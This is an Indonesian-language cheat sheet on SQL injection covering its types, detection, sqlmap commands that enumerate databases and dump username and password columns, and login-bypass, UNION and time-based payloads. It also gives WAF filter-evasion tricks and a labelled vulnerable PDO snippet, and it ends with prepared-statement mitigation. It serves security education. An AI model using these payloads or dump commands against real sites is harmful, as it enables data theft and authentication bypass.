# 💉 SQL Injection (SQLi)

## 1. Definisi
**SQL Injection (SQLi)** adalah salah satu kerentanan aplikasi web paling berbahaya yang terjadi ketika input dari pengguna disisipkan langsung ke dalam *query database* SQL tanpa proses validasi, sanitasi, atau parameterisasi yang benar. Hal ini memungkinkan penyerang untuk memanipulasi instruksi SQL yang dikirim ke database, membaca data sensitif (seperti password, data pelanggan), memodifikasi/menghapus data, hingga mengeksekusi perintah sistem operasi di server database (Remote Code Execution - RCE).

---

## 2. Jenis-Jenis SQL Injection

Secara umum, SQLi dikategorikan menjadi tiga jalur utama berdasarkan cara penyerang menerima respons dari database:

### A. In-Band SQLi (Classic SQLi)
Penyerang menggunakan saluran komunikasi yang sama untuk meluncurkan serangan dan mengumpulkan hasil.
* **Union-Based SQLi**: Memanfaatkan operator SQL `UNION` untuk menggabungkan hasil query asli dengan query tambahan buatan penyerang.
* **Error-Based SQLi**: Memaksa database menghasilkan pesan error spesifik yang membocorkan informasi sensitif (seperti nama tabel atau isi kolom) langsung ke layar web.

### B. Inferential SQLi (Blind SQLi)
Web tidak menampilkan data atau error SQL secara langsung. Penyerang menyimpulkan struktur data dengan mengirimkan pertanyaan ya/tidak (*boolean*) atau mengamati waktu respon server.
* **Boolean-Based Blind**: Mengamati apakah aplikasi web merespon secara normal (True) atau menampilkan halaman berbeda/error samar (False) ketika query logika disisipkan.
* **Time-Based Blind**: Menyisipkan query yang memaksa database untuk menunda respons (misalnya `sleep(5)`) jika kondisi yang ditanyakan bernilai benar.

### C. Out-of-Band (OOB) SQLi
Penyerang memaksa database membuat koneksi jaringan luar (seperti DNS query atau request HTTP) ke server yang dikendalikan penyerang untuk membocorkan data (biasanya digunakan ketika respons web tidak menentu atau koneksi database sangat lambat).

---

## 3. Cara Mendeteksi SQLi (Manual & Otomatis)

### 🕵️ Pengujian Manual (Fuzzing)
Langkah awal adalah menyisipkan karakter khusus pada parameter input (seperti input form, parameter GET/POST, cookie):
* Menyisipkan karakter tunggal: `'` atau `"`
* Menyisipkan operator logika: `' OR 1=1 --` atau `" OR 1=1 --`
* Menyisipkan query matematika: `id=1+1` (apakah bernilai sama dengan `id=2`?)

Jika web menampilkan error SQL (seperti *SQL syntax error*), atau halaman web berubah secara signifikan, atau web tiba-tiba memuat sangat lambat, kemungkinan besar target rentan SQLi.

### 🤖 Pengujian Otomatis dengan Sqlmap
**Sqlmap** adalah alat bantu otomatisasi deteksi dan eksploitasi SQLi yang sangat populer.

* **Scan Dasar (GET parameter)**:
  ```bash
  sqlmap -u "http://target.com/item.php?id=1" --batch
  ```
* **Scan dengan Cookie (Untuk halaman terautentikasi)**:
  ```bash
  sqlmap -u "http://target.com/dashboard.php?id=1" --cookie="PHPSESSID=xxxx" --batch
  ```
* **Scan POST Request (Simpan raw request dari Burp Suite ke file `req.txt`)**:
  ```bash
  sqlmap -r req.txt --batch
  ```
* **Mendapatkan Informasi Database**:
  ```bash
  sqlmap -r req.txt --dbs                 # List nama database
  sqlmap -r req.txt -D nama_db --tables   # List nama tabel dalam database
  sqlmap -r req.txt -D nama_db -T users --columns # List nama kolom dalam tabel
  sqlmap -r req.txt -D nama_db -T users -C username,password --dump # Mengambil isi data
  ```

---

## 4. Contoh Payload SQLi Terpopuler

### 🔑 Bypass Form Login (Authentication Bypass)
Payload dimasukkan ke form username atau password:
```sql
admin' --
admin' #
' OR 1=1 --
' OR '1'='1
```

### 🔗 Union-Based SQLi
Untuk melakukan Union, penyerang harus menyamakan jumlah kolom query asli terlebih dahulu:
1. **Mencari jumlah kolom**:
   ```sql
   ' ORDER BY 1 --
   ' ORDER BY 2 --
   ' ORDER BY 3 --  (lanjutkan sampai muncul error, misal error pada 4, berarti ada 3 kolom)
   ```
2. **Menggabungkan Query**:
   ```sql
   ' UNION SELECT 1, 2, 3 --
   ```
3. **Mengambil Versi Database & Nama Pengguna**:
   ```sql
   ' UNION SELECT 1, @@version, user() --
   ```

### ⏱️ Time-Based Blind SQLi
Payload memaksa server menunggu selama 5 detik:
```sql
' OR SLEEP(5) --
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))x) --
```

---

## 5. Teknik Bypass Filter & WAF Sederhana

Sering kali web memiliki filter dasar atau WAF (Web Application Firewall). Beberapa trik bypass manual meliputi:

* **Manipulasi Case (Ukuran Huruf)**:
  ```sql
  uNiOn SeLeCt 1, 2, 3
  ```
* **Menggunakan Inline Comments**:
  ```sql
  uni/**/on sel/**/ect 1,2,3
  ```
* **Double Encoding URL**:
  Mengubah spasi menjadi `%2520` atau `%20`, mengubah `'` menjadi `%2527`
* **Menggunakan Alternatif Spasi**:
  Menggunakan tombol Tab, baris baru (`%0a`), atau tanda kurung:
  ```sql
  UNION(SELECT(1),database())
  ```
* **Menggunakan Hex untuk String**:
  Menghindari tanda kutip satu `'` dengan mengubah teks menjadi nilai Hexadecimal:
  ```sql
  ' OR username=0x61646d696e --  (0x61646d696e adalah hex untuk 'admin')
  ```

---

## 6. Mitigasi (Pencegahan)

Satu-satunya cara mutlak untuk mencegah SQLi adalah memisahkan antara **data input pengguna** dan **instruksi query SQL**.

### ✔️ 1. Prepared Statements (Parameterized Queries)
Ini adalah metode paling aman. Kueri SQL dikompilasi terlebih dahulu di database, kemudian input pengguna dimasukkan sebagai parameter murni yang tidak akan pernah dieksekusi sebagai perintah SQL.

* **Contoh PHP PDO yang Aman (Benar)**:
  ```php
  $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username AND password = :password');
  $stmt->execute([
      'username' => $username,
      'password' => $password
  ]);
  $user = $stmt->fetch();
  ```

* **Contoh PHP PDO yang RENTAN (Salah)**:
  ```php
  // RENTAN terhadap SQLi karena variabel disisipkan langsung ke string query
  $stmt = $pdo->query("SELECT * FROM users WHERE username = '$username'");
  ```

### ✔️ 2. Stored Procedures
Menggunakan fungsi bawaan database yang diparameterisasi. Namun, pastikan stored procedure tersebut tidak merangkai string dinamis di dalamnya.

### ✔️ 3. Input Validation & Sanitization (Defense in Depth)
Lakukan validasi tipe data (misalnya pastikan input `id` berupa angka / integer) menggunakan fungsi `filter_var()` atau *casting* tipe data:
```php
$id = (int)$_GET['id']; // Aman dari SQLi berbasis numerik
```

---

## 7. Referensi Terpercaya
* [PortSwigger Web Security Academy: SQL Injection](https://portswigger.net/web-security/sql-injection)
* [OWASP Cheat Sheet Series: SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
* [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
